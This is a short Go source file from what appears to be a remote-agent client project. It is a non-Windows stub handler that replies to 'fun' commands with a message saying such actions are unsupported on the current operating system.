//go:build !windows

package handlers

import (
	"context"
	"runtime"

	rt "overlord-client/cmd/agent/runtime"
	"overlord-client/cmd/agent/wire"
)

func HandleFun(ctx context.Context, env *rt.Env, cmdID string, envelope map[string]interface{}) error {
	return wire.WriteMsg(ctx, env.Conn, wire.FunResult{
		Type:      "fun_result",
		CommandID: cmdID,
		OK:        false,
		Message:   "fun actions not supported on " + runtime.GOOS,
	})
}
